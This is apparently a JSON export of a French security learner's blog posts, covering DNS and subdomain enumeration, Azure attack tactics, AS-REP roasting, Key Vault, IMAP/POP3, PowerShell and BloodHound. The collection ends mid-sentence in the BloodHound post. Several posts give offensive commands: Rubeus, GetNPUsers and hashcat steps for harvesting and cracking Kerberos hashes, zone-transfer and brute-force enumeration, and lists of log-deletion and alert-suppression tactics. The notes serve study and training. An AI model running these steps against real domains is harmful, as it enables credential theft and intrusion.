[{"content":"Comment fonctionne le DNS Lorsque vous saisissez le nom de domaine, votre ordinateur vérifie d\u0026rsquo;abord sa mémoire (cache) pour voir s\u0026rsquo;il se souvient de l\u0026rsquo;adresse IP d\u0026rsquo;une visite précédente. Dans le cas contraire, il fait appel à un résolveur DNS, généralement fourni par votre fournisseur d\u0026rsquo;accès à Internet (FAI). Le résolveur dispose également d\u0026rsquo;un cache. S\u0026rsquo;il n\u0026rsquo;y trouve pas l\u0026rsquo;adresse IP, il entame un parcours dans la hiérarchie DNS. Il commence par interroger un serveur de noms racine, qui agit comme le bibliothécaire d\u0026rsquo;Internet. Le serveur racine ne connaît pas l\u0026rsquo;adresse exacte, mais il sait qui la connaît : le serveur de noms de domaine de premier niveau (TLD) responsable de l\u0026rsquo;extension du domaine (par exemple, .com, .org). Il oriente le résolveur dans la bonne direction. |A|Enregistrement d\u0026rsquo;adresse|Mappe un nom d\u0026rsquo;hôte à son adresse IPv4.|www.example.com.DANS UN192.0.2.1| |AAAA|Enregistrement d\u0026rsquo;adresse IPv6|Mappe un nom d\u0026rsquo;hôte à son adresse IPv6.|www.example.com.EN AAAA2001:db8:85a3::8a2e:370:7334| |CNAME|Enregistrement de nom canonique|Crée un alias pour un nom d\u0026rsquo;hôte, le pointant vers un autre nom d\u0026rsquo;hôte.|blog.example.com.EN CNAMEwebserver.example.net.| |MX|Enregistrement d\u0026rsquo;échange de courrier|Spécifie le(s) serveur(s) de messagerie chargé(s) de gérer les e-mails pour le domaine.|example.com.EN MX 10mail.example.com.| |NS|Enregistrement du serveur de noms|Délégue une zone DNS à un serveur de noms faisant autorité spécifique.|example.com.EN N.-É.ns1.example.com.| |TXT|Enregistrement de texte|Stocke des informations textuelles arbitraires, souvent utilisées pour la vérification de domaine ou les politiques de sécurité.|example.com.EN TXT \u0026quot;v=spf1 mx -all\u0026quot;(enregistrement SPF)| |SOA|Début de l\u0026rsquo;enregistrement d\u0026rsquo;autorité|Spécifie les informations administratives sur une zone DNS, y compris le serveur de noms principal, l\u0026rsquo;e-mail de la personne responsable et d\u0026rsquo;autres paramètres.|example.com.À SOAns1.example.com. admin.example.com. 2024060301 10800 3600 604800 86400| |SRV|Dossier de service|Définit le nom d\u0026rsquo;hôte et le numéro de port pour des services spécifiques.|_sip._udp.example.com.DANS SRV 10 5 5060sipserver.example.com.| |PTR|Enregistrement du pointeur|Utilisé pour les recherches DNS inversées, mappant une adresse IP à un nom d\u0026rsquo;hôte.|1.2.0.192.in-addr.arpa.EN PTRwww.example.com.|\nOutils DNS dig : Outil de recherche DNS polyvalent qui prend en charge différents types de requêtes (A, MX, NS, TXT, etc.) et une sortie détaillée. nslookup : Outil de recherche DNS plus simple, principalement pour les enregistrements A, AAAA et MX. dnsenum : Outil d\u0026rsquo;énumération DNS automatisé, attaques par dictionnaire, force brute, transferts de zone (si autorisé). dnsrecon : Combine plusieurs techniques de reconnaissance DNS et prend en charge divers formats de sortie. theHarvester : Outil OSINT qui collecte des informations provenant de diverses sources, notamment les enregistrements DNS (adresses e-mail).\nDig La digcommande ( Domain Information Groper) est un utilitaire polyvalent et puissant permettant d\u0026rsquo;interroger les serveurs DNS et de récupérer différents types d\u0026rsquo;enregistrements DNS. Sa flexibilité et ses résultats détaillés et personnalisables en font un choix incontournable.\nSous-domain Enumeration de sous-domains il s\u0026rsquo;agit du processus d\u0026rsquo;identification et de recensement systématiques de ces sous-domaines. Du point de vue DNS, les sous-domaines sont généralement représentés par des enregistrements A(ou, AAAApour IPv6, des enregistrements), qui associent le nom du sous-domaine à son adresse IP correspondante.\nÉnumération des sous-domaines actifs Une technique active plus courante brute-force enumerationconsiste à tester systématiquement une liste de noms de sous-domaines potentiels par rapport au domaine cible. Des outils comme dnsenum, ffufet gobusterpeuvent automatiser ce processus en utilisant des listes de mots de noms de sous-domaines courants ou des listes personnalisées basées sur des modèles spécifiques.\nÉnumération passive des sous-domaines Cette méthode s\u0026rsquo;appuie sur des sources d\u0026rsquo;informations externes pour découvrir les sous-domaines sans interroger directement les serveurs DNS de la cible. Certificate Transparency (CT) logsLes référentiels publics de certificats SSL/TLS constituent une ressource précieuse. Ces certificats incluent souvent une liste de sous-domaines associés dans leur champ « Subject Alternative Name » (SAN), offrant ainsi une mine d\u0026rsquo;informations sur les cibles potentielles.\nBruteforcement de sous-domaine il existe plusieurs outils disponibles qui excellent dans l’énumération par force brute : dnsénum fierce dnsrecon amass assetfinder puredns\nDNSEnum dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r Transferts de zone DNS Un transfert de zone DNS consiste essentiellement à copier tous les enregistrements DNS d\u0026rsquo;une zone (un domaine et ses sous-domaines) d\u0026rsquo;un serveur de noms à un autre.\nVous pouvez utiliser la digcommande pour demander un transfert de zone :\ndig axfr @nsztm1.digi.ninja zonetransfer.me Hotes Virtuels Une fois le DNS dirigé vers le bon serveur, la configuration du serveur web devient cruciale pour déterminer le traitement des requêtes entrantes.\nVirtual Hosts( VHosts) : Les hôtes virtuels sont des configurations au sein d\u0026rsquo;un serveur web permettant d\u0026rsquo;héberger plusieurs sites web ou applications sur un même serveur. Plusieurs outils sont disponibles pour aider à la découverte des hôtes virtuels : gobuster Feroxbuster ffuf\nGobuster Gobuster est un outil polyvalent couramment utilisé pour le forçage de répertoires et de fichiers, mais il excelle également dans la découverte d\u0026rsquo;hôtes virtuels. Il envoie systématiquement des requêtes HTTP avec différents Hosten-têtes à une adresse IP cible, puis analyse les réponses pour identifier les hôtes virtuels valides.\ngobuster vhost -u http://\u0026lt;target_IP_address\u0026gt; -w \u0026lt;wordlist_file\u0026gt; --append-domain Certificate Transparency Logs Banner Grabbing La première étape consiste à collecter les informations directement depuis le serveur web. Pour ce faire, nous utilisons la curlcommande avec l\u0026rsquo; -Iindicateur (ou --head) pour récupérer uniquement les en-têtes HTTP, et non l\u0026rsquo;intégralité du contenu de la page.\nNikto https://web.archive.org/\n","permalink":"https://nyobemichel.me/posts/learn/dns/","summary":"DNS","title":"DNS"},{"content":"Avec l\u0026rsquo;adoption massive du cloud computing, les entreprises migrent de plus en plus leurs infrastructures vers des environnements flexibles, scalables et accessibles à distance. Parmi les principaux fournisseurs de services cloud, Microsoft Azure occupe une place de leader, offrant un large éventail de services allant de la simple machine virtuelle à des solutions complexes d\u0026rsquo;intelligence artificielle, de gestion d\u0026rsquo;identité, ou encore de DevOps. Cependant, cette complexité fonctionnelle ouvre également la voie à de nombreuses erreurs de configuration, abus de privilèges et vulnérabilités potentielles. Azure, en tant que plateforme, peut être la cible de différentes techniques offensives utilisées par des attaquants internes ou externes cherchant à compromettre l’intégrité, la disponibilité ou la confidentialité des ressources cloud d’une organisation.\nAccès Initial (Initial Access) Credential stuffing (Azure AD / Entra ID) Phishing avec MFA Fatigue / Consent Phishing Token replay (refresh ou access tokens volés) Abuse des partages publics (Blob/Files avec ACL public) Exploitation de credentials hardcodés (dans code, Azure DevOps, GitHub Actions) Exploitation de mots de passe faibles sur comptes invités ou service principals Exploitation d’une app mal configurée (malicious redirect URI, consent mal géré) Évasion des Défenses (Defense Evasion) Suppression des logs dans Azure Monitor / Log Analytics Usage de credentials temporaires (MSI tokens, access tokens via IMDS) Utilisation d’applications \u0026ldquo;trusted\u0026rdquo; (abuse de consentements OAuth) Ajout de règles de suppression d’alertes dans Microsoft Defender for Cloud ByPass Conditional Access (via Identity Protection, ou device spoofing) Escalade de Privilèges (Privilege Escalation) Abus de rôles mal configurés : Owner, User Access Administrator, Contributor, etc. Chaining permissions : Lecture de secrets dans Key Vault → accès admin Escalade via Automation Account / Runbook Abuse d’un Logic App ou Function App Abus de Managed Identities (MSI) pour obtenir des tokens avec haut privilège ","permalink":"https://nyobemichel.me/posts/roadmap/azure-hacking/","summary":"Azure Hacking","title":"Azure Hacking"},{"content":"Lorsque l’authentification se produit dans Kerberos, la première chose qui se produit est une demande d’authentification au contrôleur de domaine afin que l’identité qui tente de s’authentifier puisse être vérifiée. Cette demande est connue sous le nom de demande de serveur d’authentification (AS-REQ). Une fois l\u0026rsquo;authentification du client validée, le contrôleur de domaine envoie une réponse du serveur d\u0026rsquo;authentification (AS-REP) au client, contenant une clé de session et un ticket d\u0026rsquo;octroi de ticket (TGT). AS-REP Roasting vide les hachages krbasrep5 des comptes utilisateurs dont la pré-authentification Kerberos est désactivée. Contrairement à Kerberoasting, ces utilisateurs ne doivent pas nécessairement être des comptes de service. La seule condition pour pouvoir effectuer AS-REP Roasting sur un utilisateur est que la pré-authentification soit désactivée.\nrubeus.exe asreproast Déchiffrez ces hachages avec hashcat - 1.) Transférez le hachage de la machine cible vers votre machine attaquante et placez le hachage dans un fichier txt\n2.) Insérez 23$ après $krb5asrep$ afin que la première ligne soit $krb5asrep$23$User\u0026hellip;..\nUtilisez la même liste de mots que celle que vous avez téléchargée dans la tâche 4\n3.) hashcat -m 18200 hash.txt Pass.txt - Décryptez ces hachages ! La torréfaction Rubeus AS-REP utilise le mode hashcat 18200.\nEnumeration - Identification des comptes vulnérables Au cours de cette phase, vous identifiez les comptes utilisateurs Active Directory pour lesquels la pré-authentification Kerberos est désactivée. Les comptes sans pré-authentification permettent à tout utilisateur du réseau de demander un ticket Kerberos (notamment un AS-REP) sans avoir à prouver son identité. Rubeus GetNPUsers.py d\u0026rsquo;Impacket\nGetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py https://www.hackthebox.com/blog/as-rep-roasting-detection\n","permalink":"https://nyobemichel.me/posts/activedirectory/as-rep-roasting/","summary":"Entra ID","title":"AS-REP roasting"},{"content":"Le moyen le plus simple d\u0026rsquo;accéder aux données WHOIS est d\u0026rsquo;utiliser l\u0026rsquo; whoisoutil en ligne de commande. IANA (Internet Assigned Numbers Authority )\n","permalink":"https://nyobemichel.me/posts/outils/whois/","summary":"Whois","title":"Whois"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/active-directory---hacking/","summary":"key vault","title":"Active Directory - Hacking"},{"content":"Qu’est-ce qu’Azure Key Vault ? Azure Key Vault est un service cloud permettant de stocker les secrets et d’y accéder en toute sécurité.Il peut s’agir de:\nLes secrets : mots de passe, chaînes de connexion, jetons, etc. Les clés de chiffrement : pour chiffrer des données dans d\u0026rsquo;autres services. Les certificats : certificats SSL/TLS utilisés dans des services Azure. Les modules HSM (Hardware Security Modules) : stocker les clés dans du matériel sécurisé. son objectif est d\u0026rsquo;éviter d\u0026rsquo;intégrer des données directement dans le code source d\u0026rsquo;un programme ou d\u0026rsquo;un autre objet exécutable les fichiers de configuration. cas d\u0026rsquo;tilisation de Azure Key Vault La centralisation du stockage des secrets d’application dans Azure Key Vault vous permet de contrôler la distribution de ces secrets. Key Vault réduit considérablement les risques de fuite accidentelle des secrets. Lorsque les développeurs d’applications utilisent Key Vault, ils n’ont plus besoin de stocker des informations de sécurité dans leur application.\nAuthentification sécurisée : Une app web récupère un secret DB via Key Vault Chiffrement de données : Azure SQL, Blob, ou Disk utilisent une clé stockée dans Key Vault Rotation automatique : Gestion automatique des certificats SSL Intégration DevSecOps : Azure DevOps ou GitHub récupèrent des secrets à l\u0026rsquo;exécution\nArchitecture et composants Le service Key Vault prend en charge deux types de conteneurs : les coffres et les pools HSM (modules de sécurité matériels) managés. Les coffres prennent en charge le stockage des clés logicielles et sauvegardées avec HSM, les secrets et les certificats. Les pools HSM managés prennent uniquement en charge les clés sauvegardées avec HSM. les secrets et les certificats sont collectivement appelés « objets ».\nIdentificateurs d\u0026rsquo;objet Les objets sont identifiés de manière unique dans Key Vault à l’aide d’un identificateur qui ne respecte pas la casse appelé identificateur d’objet. Il n’y a pas deux objets avec le même identificateur dans le système, quel que soit l’emplacement géographique. L’identificateur est constitué d’un préfixe qui identifie le coffre de clés, du type d’objet, du nom d’objet fourni par l’utilisateur et d’une version d’objet. Les identificateurs qui n’incluent pas la version de l’objet sont appelés des « identificateurs de base ». Les identificateurs d’objet Key Vault sont également des URL valides.\nUn identificateur d’objet a le format général suivant (selon le type de conteneur) :\nPour les coffres : https://{vault-name}.vault.azure.net/{object-type}/{object-name}/{object-version} Pour les pools Managed HSM : https://{hsm-name}.managedhsm.azure.net/{object-type}/{object-name}/{object-version} Structure d’URL de requête Les opérations de gestion des clés utilisent des verbes HTTP, notamment DELETE, GET, PATCH et PUT. Les opérations de chiffrement sur les objets clés existants utilisent HTTP POST.\nPour les clients qui ne peuvent pas prendre en charge des verbes HTTP spécifiques, Azure Key Vault autorise l’utilisation de HTTP POST avec l’en-tête X-HTTP-REQUEST pour spécifier le verbe prévu.\nPour utiliser des objets dans Azure Key Vault, voici des exemples d’URL :\nPour CRÉER une clé appelée TESTKEY dans un coffre de clés, utilisez : PUT /keys/TESTKEY?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour IMPORTER une clé appelée IMPORTEDKEY dans un coffre de clés, utilisez - POST /keys/IMPORTEDKEY/import?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour OBTENIR un secret appelé MYSECRET dans un coffre de clés, utilisez - GET /secrets/MYSECRET?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nPour SIGNER un code de hachage utilisant une clé nommée TESTKEY dans Key Vault, utilisez : POST /keys/TESTKEY/sign?api-version=\u0026lt;api_version\u0026gt; HTTP/1.1\nL’autorité pour une demande adressée à un Key Vault est toujours la suivante :\nPour les coffres : https://{keyvault-name}.vault.azure.net/ Pour les modules HSM managés : https://{HSM-name}.managedhsm.azure.net/ les clés sont toujours stockées sous le chemin /keys, tandis que les secrets sont toujours stockés sous le chemin /secrets. Options d’authentification Key Vault Lorsque vous créez un coffre de clés dans un abonnement Azure, il est automatiquement associé au locataire Microsoft Entra de l’abonnement. les applications peuvent accéder au coffre de clés de trois manières : Application uniquement : l’application représente un principal du service ou une identité managée. Utilisateur uniquement : l’utilisateur accède au coffre de clés à partir de n’importe quelle application inscrite dans le locataire. Application-plus-utilisateur (parfois appelé identité composée) : l’utilisateur est tenu d’accéder au coffre de clés à partir d’une application spécifique et l’application doit utiliser le flux OBO (Authentification On-Behalf-Of) pour emprunter l’identité de l’utilisateur.\nmodèle d’accès L’accès à un coffre de clés est contrôlé par le biais de deux interfaces : le plan de contrôle et le plan de données. Les deux plans utilisent Microsoft Entra ID pour l’authentification. Pour l’autorisation, le plan de contrôle utilise le contrôle d’accès en fonction du rôle Azure (Azure RBAC) et le plan de données utilise une stratégie d’accès Key Vault et Azure RBAC pour les opérations de plan de données Key Vault.\nKey Vault prend en charge les stratégies d’accès conditionnel Microsoft Entra. Vous pouvez contrôler l’accès aux clés, aux certificats et aux secrets Key Vault en utilisant des stratégies d’accès Azure RBAC ou Key Vault. créez un coffre de clés dans Azure Key Vault Azure Key Vault est un service cloud qui fonctionne comme un magasin des secrets sécurisé. Vous pouvez stocker des clés, des mots de passe, des certificats et d’autres secrets en toute sécurité.\nSi vous ne disposez pas d’un compte Azure, créez-en un gratuitement avant de commencer. Utilisez l’environnement Bash dans Azure Cloud Shell. https://shell.azure.com/ Si vous préférez exécuter des commandes de référence CLI localement, installez Azure CLI. Si vous exécutez sur Windows ou macOS, envisagez d’exécuter Azure CLI dans un conteneur Docker. Si vous utilisez une installation locale, connectez-vous à Azure CLI à l’aide de la commande az login. Lorsque vous y êtes invité, installez l’extension Azure CLI lors de la première utilisation. Exécutez az version pour rechercher la version et les bibliothèques dépendantes installées. Pour effectuer une mise à niveau vers la dernière version, exécutez az upgrade. Créer un groupe de ressources Un groupe de ressources est un conteneur logique dans lequel les ressources Azure sont déployées et gérées. Utilisez la commande az group create pour créer un groupe de ressources nommé myResourceGroup à l’emplacement eastus. az group create --name \u0026#34;myResourceGroup\u0026#34; --location \u0026#34;EastUS\u0026#34; Créer un coffre de clés Utilisez la commande Azure CLI az keyvault create pour créer un coffre de clés dans le groupe de ressources de l’étape précédente. Vous devrez fournir certaines informations : Nom du coffre de clés : chaîne de 3 à 24 caractères qui ne peut contenir que des chiffres (0-9), des lettres (a-z, A-Z) et des traits d’union (-).\nImportant\nChaque coffre de clés doit avoir un nom unique. Remplacez par le nom de votre coffre de clés dans les exemples suivants.\nGroupe de ressources nommé : myResourceGroup. Localisation : EastUS. az keyvault create --name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --resource-group \u0026#34;myResourceGroup\u0026#34; Donner à votre compte d’utilisateur des autorisations pour gérer les secrets dans Key Vault Pour obtenir des autorisations sur votre coffre de clés par le biais du contrôle d’accès en fonction du rôle (RBAC ), attribuez un rôle à votre « nom d’utilisateur principal » (UPN) à l’aide de la commande Azure CLI az role assignment create. az role assignment create --role \u0026#34;Key Vault Secrets Officer\u0026#34; --assignee \u0026#34;\u0026lt;upn\u0026gt;\u0026#34; --scope \u0026#34;/subscriptions/\u0026lt;subscription-id\u0026gt;/resourceGroups/\u0026lt;resource-group-name\u0026gt;/providers/Microsoft.KeyVault/vaults/\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; Ajouter un secret au coffre de clés Utilisez la commande Azure CLI az keyvault secret set suivante pour créer une clé secrète dans Key Vault az keyvault secret set --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --name \u0026#34;ExamplePassword\u0026#34; --value \u0026#34;hVFkk965BuUv\u0026#34; Récupérer un secret à partir de Key Vault Vous pouvez maintenant référencer ce mot de passe que vous avez ajouté à Azure Key Vault à l’aide de son URI. Utilisez https://\u0026lt;your-unique-keyvault-name\u0026gt;.vault.azure.net/secrets/ExamplePassword pour obtenir la version actuelle. Pour afficher la valeur contenue dans le secret sous forme de texte brut, utilisez la commande Azure CLI az keyvault secret show :\naz keyvault secret show --name \u0026#34;ExamplePassword\u0026#34; --vault-name \u0026#34;\u0026lt;your-unique-keyvault-name\u0026gt;\u0026#34; --query \u0026#34;value\u0026#34; Key Vault est conçu pour stocker des secrets de configuration pour des applications serveur. Il n’est pas destiné au stockage des données appartenant aux utilisateurs de votre application. Les données utilisateur doivent être stockées ailleurs, par exemple, dans une base de données Azure SQL avec chiffrement transparent des données (Transparent data encryption), ou dans un compte de stockage avec chiffrement du service de stockage (Storage Service Encryption).\nRessources :\nhttps://learn.microsoft.com/fr-fr/cli/azure/keyvault?view=azure-cli-latest https://learn.microsoft.com/fr-fr/training/modules/manage-secrets-with-azure-key-vault/?source=recommendations https://learn.microsoft.com/fr-fr/azure/key-vault/general/security-features\n","permalink":"https://nyobemichel.me/posts/azure/key-vault/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/aws---hacking/","summary":"key vault","title":"Key Vault"},{"content":"","permalink":"https://nyobemichel.me/posts/roadmap/web-hacking/","summary":"key vault","title":"Key Vault"},{"content":"Dans le monde des distributions Linux et windows, il existe de nombreuses façons de gérer les serveurs à distance.\nSSH Secure Shell( SSH) permet à deux ordinateurs d\u0026rsquo;établir une connexion chiffrée et directe au sein d\u0026rsquo;un réseau potentiellement non sécurisé sur le port standard TCP 22. Il existe donc deux protocoles concurrents : SSH-1et SSH-2. SSH-2, également connu sous le nom de SSH version 2, est un protocole plus avancé que SSH version 1 en termes de chiffrement, de vitesse, de stabilité et de sécurité. Par exemple, SSH-1 il est vulnérable aux MITMattaques, contrairement à SSH-2.\nRsync Rsync est un outil rapide et efficace pour copier des fichiers localement et à distance. Il permet de copier des fichiers localement sur une machine donnée et vers/depuis des hôtes distants.\nR-Services Les R-Services sont une suite de services hébergés pour permettre l\u0026rsquo;accès à distance ou l\u0026rsquo;exécution de commandes entre hôtes Unix via TCP/IP. R-servicesS\u0026rsquo;étendant sur les ports 512, 513, et 514et , ils ne sont accessibles que via une suite de programmes appelée r-commands. Ils sont le plus souvent utilisés par les systèmes d\u0026rsquo;exploitation commerciaux tels que Solaris, HP-UX et AIX. La suite R-commands se compose des programmes suivants :\nrcp ( remote copy) rexec ( remote execution) connexion r ( remote login) rsh ( remote shell) rstat temps de rupture rwho ( remote who) RDP Le protocole RDP (Remote Desktop Protocol RDPest un protocole développé par Microsoft pour l\u0026rsquo;accès à distance à un ordinateur exécutant Windows. Ce protocole permet la transmission chiffrée de commandes d\u0026rsquo;affichage et de contrôle via l\u0026rsquo;interface utilisateur graphique (GUI) sur les réseaux IP.\nWinRM La gestion à distance Windows ( WinRM) est un protocole simple de gestion à distance intégré à Windows, basé sur la ligne de commande. WinRM utilise le protocole Simple Object Access Protocol ( SOAP) pour établir des connexions aux hôtes distants et à leurs applications. Par conséquent, WinRM doit être explicitement activé et configuré à partir de Windows 10. WinRM s\u0026rsquo;appuie sur TCPles ports 5985et 5986pour communiquer.\nWMI Windows Management Instrumentation ( WMI) est l\u0026rsquo;implémentation de Microsoft et une extension du modèle commun d\u0026rsquo;information ( CIM), fonctionnalité essentielle de la gestion d\u0026rsquo;entreprise Web standardisée ( WBEM) pour la plateforme Windows.\nhttps://www.golinuxcloud.com/openssh-authentication-methods-sshd-config/ https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html\n","permalink":"https://nyobemichel.me/posts/learn/protocoles-de-gestion-%C3%A0-distance/","summary":"Protocoles de gestion à distance Linux","title":"Protocoles de gestion à distance"},{"content":"Par défaut, les ports 110et 995sont utilisés pour POP3, et les ports 143et 993sont utilisés pour IMAP. Les ports supérieurs ( 993et 995) utilisent TLS/SSL pour chiffrer les communications entre le client et le serveur. Grâce à Nmap, nous pouvons analyser le serveur à la recherche de ces ports\nPour interagir avec le serveur IMAP ou POP3 via SSL, nous pouvons utiliser openssl, ainsi que ncat. Les commandes correspondantes sont les suivantes :\nopenssl s_client -connect 10.129.14.128:pop3s nmap -p 143,993 --script imap-ntlm-info 10.0.0.3 msf6 auxiliary(scanner/pop3/pop3_version) Commandes IMAP 1 LOGIN username password Connexion de l\u0026rsquo;utilisateur. 1 LIST \u0026quot;\u0026quot; * Répertorie tous les répertoires. 1 CREATE \u0026quot;INBOX\u0026quot; Crée une boîte aux lettres avec un nom spécifié. 1 DELETE \u0026quot;INBOX\u0026quot; Supprime une boîte aux lettres. 1 RENAME \u0026quot;ToRead\u0026quot; \u0026quot;Important\u0026quot; Renomme une boîte aux lettres. 1 LSUB \u0026quot;\u0026quot; * Renvoie un sous-ensemble de noms de l\u0026rsquo;ensemble de noms que l\u0026rsquo;utilisateur a déclaré comme étant activeou subscribed. 1 SELECT INBOX Sélectionne une boîte aux lettres afin que les messages qu\u0026rsquo;elle contient soient accessibles. 1 UNSELECT INBOX Quitte la boîte aux lettres sélectionnée. 1 FETCH \u0026lt;ID\u0026gt; all Récupère les données associées à un message dans la boîte aux lettres. 1 CLOSESupprime tous les messages avec l\u0026rsquo; Deletedindicateur défini 1 LOGOUTFerme la connexion avec le serveur IMAP.\nCommandes POP3 USER username Identifie l\u0026rsquo;utilisateur. PASS password Authentification de l\u0026rsquo;utilisateur à l\u0026rsquo;aide de son mot de passe. STAT Demande le nombre d\u0026rsquo;e-mails enregistrés auprès du serveur. LIST Demande au serveur le nombre et la taille de tous les e-mails. RETR id Demande au serveur de livrer l\u0026rsquo;e-mail demandé par ID. DELE id Demande au serveur de supprimer l\u0026rsquo;e-mail demandé par ID. CAPADemande au serveur d\u0026rsquo;afficher les capacités du serveur. RSETDemande au serveur de réinitialiser les informations transmises. QUIT Ferme la connexion avec le serveur POP3.\nhttps://donsutherland.org/crib/imap https://www.atmail.com/blog/imap-101-manual-imap-sessions/\n","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-imap----pop3/","summary":"IMAP/POP3","title":"Enumeration IMAP - POP3"},{"content":"Bienvenue dans cet annuaire complet de ressources en cybersécurité, cloud, DevOps, administration système, réseau, conteneurisation (Docker/Kubernetes), Red Team et Blue Team. Que vous soyez étudiant, professionnel en reconversion, passionné autodidacte ou ingénieur confirmé, ce guide regroupe des liens vers des plateformes gratuites et payantes pour apprendre, pratiquer, expérimenter et se certifier dans les domaines clés de la sécurité informatique et de l\u0026rsquo;administration des systèmes modernes.\nLa cybersécurité est un domaine en constante évolution. Il ne suffit plus d’apprendre en théorie : il faut pratiquer sur des environnements réalistes, se mesurer à des défis techniques, et découvrir les bonnes pratiques du monde réel. C’est dans cette optique que cet annuaire a été conçu : rassembler les meilleurs Labs interactifs, plateformes d\u0026rsquo;entraînement et simulateurs cloud accessibles sur Internet, tout en vous évitant de perdre du temps à chercher.\nHack The Box (HTB) Hack The Box Academy TryHackMe PentesterLab PortSwigger Web Security Academy Cyber Learning Red Labs - Altered Security Root Me VulnHub VulnMachines OWASP Juice Shop Damn Vulnerable Web App (DVWA) HackSplaining HackThisSite HackerTest SEED Security Labs pwnable.kr ZenK-Security Hacker101 CTF White-box pentesting (GitHub) Damn Vulnerable GraphQL App (GitHub) Generic University (GitHub) API Sandbox (GitHub) OWASP Docker Compose Top 10 OWASP Top 10 Labs Blue Team Labs Online RangeForce LetsDefend Security Blue Team Cyber Defenders Splunk Security Essentials Microsoft Applied Skills AWS Skill Builder Google Cloud Skills Boost CloudGoat - AWS (GitHub) AzureGoat (GitHub) AWSGoat (GitHub) TerraGoat (GitHub) Flaws.cloud Flaws2.cloud BigIAM Challenge Serverless CTF (SANS CloudWars) BadZure (GitHub) BustaKube SadServers KodeKloud Labs Gratuits LabEx Iximiuz Labs Play with Docker Linux Survival Bandit Wargame Kubernetes Goat Kubernetes Goat (GitHub) CI/CD Goat (GitHub) Atomic Red Team (GitHub) SQL Murder Mystery SQL Squid Game VIM Adventures Pwn College Pwn Tunisia 247CTF Crypto Challenge – Mystery Twister VulnLab Immersive Labs Red Team Attack Lab (GitHub) ADSecurity Harmj0y\u0026rsquo;s Blog GOAD (GitHub) lab redteamleaders thehacker.recipes Cloud Security Labs Training cybersecurity classes on a variety of topics API Academy Hackerone CryptoHack Pentester Lab ","permalink":"https://nyobemichel.me/posts/learn/les-liens-essentiels/","summary":"annuaire complet de ressources en cybersécurité","title":"Les Liens Essentiels"},{"content":"","permalink":"https://nyobemichel.me/posts/enumeration/enumeration-ad---interne/","summary":"SMTP","title":"Enumeration AD - Interne"},{"content":"Introduction à PowerShell PowerShell est à la fois un langage de script puissant et un environnement en ligne de commande pour les systèmes Windows. Il est construit sur le framework .NET, ce qui lui permet de manipuler des objets complexes directement en ligne de commande.\nCommandes PowerShell de base Utilisation de Get-Help La commande Get-Help affiche des informations sur une cmdlet (commande PowerShell). Pour obtenir de l’aide sur une commande spécifique :\nGet-Help Nom-De-La-Commande Pour voir des exemples d\u0026rsquo;utilisation concrets :\nGet-Help Nom-De-La-Commande -Examples Utilisation de Get-Command Get-Command permet de lister toutes les cmdlets disponibles sur le système. Elle supporte également les filtres par motif :\nGet-Command Verb-* Get-Command *-Noun Par exemple :\nGet-Command New-* affichera toutes les cmdlets commençant par le verbe New.\nLe pipeline (|) Le pipeline (|) permet de transmettre la sortie d’une commande comme entrée à une autre. Contrairement aux autres shells (comme Bash), PowerShell passe des objets, et non du texte.\nExemple :\nGet-Command | Get-Member -MemberType Method Cela permet d’examiner les méthodes disponibles sur les objets retournés par Get-Command.\nCréation d’objets avec Select-Object Pour manipuler les résultats d’une commande et ne conserver que certaines propriétés :\nGet-ChildItem | Select-Object -Property Mode, Name Filtrage des objets avec Where-Object Pour filtrer les objets selon des critères précis :\nGet-Process | Where-Object -Property CPU -GT 100 Ou en notation script block :\nGet-Process | Where-Object { $_.CPU -gt 100 } Opérateurs courants : -Contains : contient exactement la valeur\n-EQ : égal\n-GT : supérieur\nTrier les objets avec Sort-Object Pour trier la sortie d’une commande :\nGet-Process | Sort-Object CPU Quelques commandes utiles Rechercher un fichier dans un dossier Get-ChildItem -Path \u0026#34;C:\\Users\\Michel\\Documents\u0026#34; -Recurse -Filter \u0026#34;rapport.docx\u0026#34; Obtenir le répertoire de travail actuel Get-Location Faire une requête HTTP Invoke-WebRequest -Uri \u0026#34;https://example.com\u0026#34; Énumération système Nombre d’utilisateurs locaux Get-LocalUser Informations détaillées sur tous les comptes utilisateur Get-WmiObject -Class Win32_UserAccount Obtenir l’adresse IP locale Get-NetIPAddress Voir les ports à l’écoute Get-NetTCPConnection | Where-Object { $_.State -eq \u0026#34;Listen\u0026#34; } Lister tous les processus en cours Get-Process Lister toutes les tâches planifiées Get-ScheduledTask Obtenir la liste de contrôle d’accès (ACL) Get-Acl -Path \u0026#34;C:\\chemin\\du\\dossier-ou-fichier\u0026#34; Pour aller plus loin https://learnxinyminutes.com/powershell/\nhttps://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/where-object\n","permalink":"https://nyobemichel.me/posts/articles/powershell/","summary":"PowerShell","title":"PowerShell"},{"content":"La reconnaissance est une étape clé dans toute campagne de Red Team ou d’audit de sécurité Active Directory. BloodHound est un outil puissant permettant de visualiser et d’analyser les relations d’un domaine Active Directory en utilisant la théorie des graphes.\nBloodHound : Présentation BloodHound est une application qui cartographie les relations entre les objets Active Directory (utilisateurs, groupes, ordinateurs, sessions, délégations, ACL, etc.) pour identifier des chemins d’attaque possibles, tels que les escalades de privilèges ou les mouvements latéraux.\nIl repose sur une base de données orientée graphe, Neo4j, et une interface graphique puissante qui permet d\u0026rsquo;exécuter des requêtes en langage Cypher pour analyser les chemins d\u0026rsquo;attaque.\nCollecte de données avec bloodhound-python L’outil classique SharpHound peut être remplacé par bloodhound-python, une alternative sans agent écrite en Python. Cela permet une collecte depuis une machine Linux ou directement via un shell Python dans certains cas de compromission.\nExemple de commande complète : sudo bloodhound-python -d \u0026lt;domain\u0026gt; -u \u0026lt;username\u0026gt;@\u0026lt;domain\u0026gt; -p \u0026lt;password\u0026gt; -c all -ns \u0026lt;domain_controller_ip\u0026gt; -v Une fois la collecte 